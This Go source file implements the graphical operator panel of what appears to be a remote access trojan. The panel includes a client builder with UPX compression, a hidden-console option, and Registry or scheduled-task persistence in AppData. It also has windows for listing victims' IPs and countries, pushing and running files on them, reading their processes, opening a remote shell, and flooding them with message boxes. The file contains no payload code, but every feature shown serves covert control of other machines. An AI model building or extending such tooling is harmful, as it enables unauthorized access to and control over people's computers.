package render

import (
	"fmt"

	g "github.com/AllenDang/giu"

	"github.com/codeuk/pout/cmd/server"
)

// `ServerManagerLayout` returns the window Layout for the Server Manager window.
func ServerManagerLayout() *g.Layout {
	return &g.Layout{
		g.Label("Server Manager"),
		// Server Manager tabs.
		g.TabBar().TabItems(
			// Server status information, analytics and graphs.
			// This will probably be removed or ported to a bar chart (clients/hr).
			g.TabItem("Analytics").Layout(
				g.Row(
					g.Plot("Connections").
						AxisLimits(server.CurrentServer.Graph.DataMin, server.CurrentServer.Graph.DataMax, 0, 1, g.ConditionOnce).
						Flags(g.PlotFlagsEqual|g.PlotFlagsNoMousePos).
						YAxeFlags(g.PlotAxisFlagsNoDecorations, 0, 0).
						XAxeFlags(g.PlotAxisFlagsTime).Plots(
						g.PlotLineXY(
							"Time Line",
							server.CurrentServer.Graph.DataX,
							server.CurrentServer.Graph.ScatterY),
						g.PlotScatterXY(
							"Client(s)",
							server.CurrentServer.Graph.DataX,
							server.CurrentServer.Graph.ScatterY),
					).Size(760, int(g.Auto)),

					g.Plot("Architecture").
						Flags(g.PlotFlagsEqual|g.PlotFlagsNoMousePos).
						XAxeFlags(g.PlotAxisFlagsNoDecorations).
						YAxeFlags(g.PlotAxisFlagsNoDecorations, 0, 0).
						AxisLimits(0, 1, 0, 1, g.ConditionAlways).
						Plots(
							g.PlotPieChart([]string{"Windows", "Linux", "Darwin"}, []float64{0.22, 0.38, 0.4}, 0.5, 0.5, 0.45),
						).Size(int(g.Auto), int(g.Auto)),
				),
			),

			// Socket server and client interaction logs.
			g.TabItem("Logs").Layout(
				g.Layout{
					g.Button("Clear").OnClick(server.CurrentServer.Logs.Clear),
					g.ListBox("Logs", server.CurrentServer.Logs.Entries),
				},
			),
		),
	}
}

// `ConnectedMachinesLayout` returns the window Layout for the Connected Machines window.
func ConnectedMachinesLayout() *g.Layout {
	return &g.Layout{
		g.Label(fmt.Sprintf("Connected Machines (%d)", len(server.CurrentServer.Connections))),
		// Interactive Machines table.
		g.Table().
			Columns(
				g.TableColumn("ID"),
				g.TableColumn("OS"),
				g.TableColumn("Name"),
				g.TableColumn("IP"),
				g.TableColumn("Country"),
				g.TableColumn("Access"),
				g.TableColumn("Connected"),
			).
			Rows(CreateClientTable()...),
	}
}

// `ClientBuilderLayout` returns the window Layout for the Client Builder window.
func ClientBuilderLayout() *g.Layout {
	return &g.Layout{
		g.SplitLayout(
			g.DirectionHorizontal, 200,

			g.Layout{
				// Basic client configuration settings.
				g.Layout{
					g.Label("Host: "),
					g.InputText(&ClientBuildConfig.Host).Size(g.Auto),
					g.Tooltip("Make sure this is set to your server/VPN's external IPv4 Address.\nOtherwise, only clients on your local network will be able to connect."),

					g.Label("Port: "),
					g.InputInt(&ClientBuildConfig.Port).Size(g.Auto),
					g.Tooltip("Make sure you have port-forwarded on this port.\nOtherwise, clients will not be able to communicate with the server."),
				},

				// Save options.
				g.Layout{
					g.Row(
						g.InputText(&ClientBuildConfig.File).Size(95),
						g.Tooltip("Filename to save the build file as (must be .exe)."),

						g.Button("Build Client").OnClick(func() {
							go func() {
								// Write the ClientBuildConfig settings to the clients config file.
								if err := ClientBuildConfig.WriteConfig(); err != nil {
									server.CurrentServer.Logs.Add(err.Error())
								}

								// Build (and compress if supplied) the client.
								if err := ClientBuildConfig.BuildClient(); err != nil {
									server.CurrentServer.Logs.Add(err.Error())
								} else {
									server.CurrentServer.Logs.Add(fmt.Sprintf("Successfully built client! client/build/%s", ClientBuildConfig.File))
								}
							}()
						}),
						g.Tooltip("Builds the executable in the client/build folder"),
					),

					g.Label(ClientBuildConfig.Status),
				},
			},

			g.Layout{
				// Build options.
				g.Layout{
					g.Label("Build Options"),
					g.Row(
						g.Checkbox("Compress", &ClientBuildConfig.CompressUPX),
						g.Tooltip("The build executable will be compressed using UPX (recommended)."),

						g.Checkbox("Hide Console", &ClientBuildConfig.NoConsoleUI),
						g.Tooltip("When executed, no console window will be shown (can be buggy when running commands)."),
					),
				},

				// Persistence configuration settings.
				g.Layout{
					g.Label("Persistence Methods"),
					g.Row(
						g.Checkbox("Registry", &ClientBuildConfig.StartupPersistence),
						g.Checkbox("SCHTASKS", &ClientBuildConfig.SchedulerPersistence),
						g.Tooltip("This persistence method requires admin privileges on the client."),
					),

					// The AppData folder and file names to store and use as the persistent executable.
					g.Label("AppData Folder: "),
					g.InputText(&ClientBuildConfig.AppDataFolderName).Size(g.Auto),

					g.Label("AppData File: "),
					g.InputText(&ClientBuildConfig.AppDataFileName).Size(g.Auto),
				},
			},
		),
	}
}

// `FileExecutorLayout` returns the window Layout for the File Executor window.
func FileExecutorLayout(client *server.Client) *g.Layout {
	return &g.Layout{
		// File dropper and clearer.
		g.Row(
			g.Label("Drag and drop files here..."),
			g.Button("Clear").OnClick(func() {
				FilesToSend = []server.ClientFile{}
				FilesUploadedStr = ""
			}),
		),

		// Read-only multiline input box to display the local file paths for each of the dropped files.
		g.InputTextMultiline(&FilesUploadedStr).Size(g.Auto, 100).Flags(g.InputTextFlagsReadOnly),
		g.Tooltip("The file executor can be buggy if more than one file is uploaded.\nTry executing one file at a time!"),

		g.Button("Execute Files").OnClick(func() {
			// Send the dropped files to the client.
			for _, file := range FilesToSend {
				go client.RunFile(file)
			}
		}),
	}
}

// `ProcessManagerLayout` returns the window Layout for the Process Manager window.
func ProcessManagerLayout(client *server.Client) *g.Layout {
	if client.MetaData.Processes == nil || len(client.MetaData.Processes) == 0 {
		// Return a placeholder window if the clients running processes haven't loaded yet
		// or for some reason we're unable to access them.
		return &g.Layout{
			g.Label("Getting running processes..."),
		}
	}

	return &g.Layout{
		g.Label("Running Processes"),
		// Time interval (in milliseconds) to update the clients processes.
		g.SliderInt(&client.ProcessMonitor.ProcessUpdateTime, 250, 10000).Label("Update Time (ms)").Size(150),
		g.Tooltip("Amount of milliseconds to refresh/update the clients processes."),

		g.Table().
			Columns(
				g.TableColumn("Name"),
				g.TableColumn("PID"),
				g.TableColumn("Usage"),
			).
			Rows(CreateProcessTable(client)...),
	}
}

// `RemoteShellLayout` returns the window Layout for the Remote Shell window.
func RemoteShellLayout(client *server.Client) *g.Layout {
	return &g.Layout{
		g.SplitLayout(
			g.DirectionHorizontal, 173,

			// Create the command input and configuration boxes for the remote shell.
			g.Layout{
				g.Label("Command to Execute:"),
				g.InputText(&client.CmdData.CommandToExecute).Size(g.Auto),
				g.Tooltip("This command will be sent to the client and executed.\nMake sure not to send invalid commands as this can cause problems."),

				g.Row(
					g.Button("Execute").OnClick(func() {
						// Send the command input to the client.
						go client.GetCommandOutput(client.CmdData.CommandToExecute)
					}),
					g.Button("Clear Output").OnClick(func() {
						// Reset the multiline command output box.
						client.CmdData.CommandOutput = ""
					}),
				),
			},

			// Create the output text box to display the commands output.
			g.Layout{
				g.Label("Command Output:"),
				g.InputTextMultiline(&client.CmdData.CommandOutput).Size(g.Auto, g.Auto).Flags(g.InputTextFlagsReadOnly),
			},
		),
	}
}

// `URLOpenerLayout` returns the window Layout for the URL Opener window.
func URLOpenerLayout(client *server.Client) *g.Layout {
	return &g.Layout{
		// URL input to format into the "start url" command.
		g.Label("URL (ex. https://example.com):"),
		g.InputText(&URLToOpen).Size(g.Auto),

		g.Button("Open").OnClick(func() {
			// Send the command to open the url on the client.
			go client.GetCommandOutput(fmt.Sprintf("start %s", URLToOpen))
		}),
	}
}

// `MessageBoxSenderLayout` returns the window Layout for the Message Box Sender window.
func MessageBoxSenderLayout(client *server.Client) *g.Layout {
	// Stringified selections of Icon and Button choices for the MessageBox.
	iconListStr := []string{"None", "ERROR", "QUESTION", "WARNING", "INFORMATION"}
	buttonListStr := []string{"OK", "OK/CANCEL", "ABORT/RETRY/IGNORE", "YES/NO/CANCEL", "YES/NO", "RETRY/CANCEL", "CANCEL/TRYAGAIN/CONTINUE"}

	return &g.Layout{
		g.SplitLayout(
			g.DirectionHorizontal, 200,

			// Title and content setters for the message box.
			g.Layout{
				g.Label("Title:"),
				g.InputText(&MessageBoxToSend.Title).Size(g.Auto),
				g.Label("Content:"),
				g.InputText(&MessageBoxToSend.Content).Size(g.Auto),
				g.Row(
					g.Button("Send").OnClick(func() {
						// Send the built MessageBox to display on the client.
						go client.SendMessageBox(MessageBoxToSend)
					}),
					g.Button("Preview").OnClick(func() {
						// Display the built MessageBox on the server as a preview.
						go MessageBoxToSend.Show()
					}),
					g.Tooltip("When previewing the message box, only 1 will be shown."),
				),
			},

			// Icon and button dropdown selectors for the message box.
			g.Layout{
				g.Label("Customization"),
				g.Combo("Icon", iconListStr[IconIndexLastSelected], iconListStr, &IconIndexLastSelected).OnChange(func() {
					MessageBoxToSend.Icon = server.IconListPtr[IconIndexLastSelected]
				}).Size(g.Auto),

				g.Combo("Button(s)", buttonListStr[ButtonIndexLastSelected], buttonListStr, &ButtonIndexLastSelected).OnChange(func() {
					MessageBoxToSend.Buttons = server.ButtonListPtr[ButtonIndexLastSelected]
				}).Size(g.Auto),

				g.Label("Controls"),
				g.SliderInt(&MessageBoxToSend.Amount, 1, 100).Label("Amount"),
				g.Tooltip("Amount of times to display the message box."),
				g.SliderInt(&MessageBoxToSend.Delay, 1, 1000).Label("Delay (ms)"),
				g.Tooltip("Amount of milliseconds to wait before displaying the next message box."),
			},
		),
	}
}
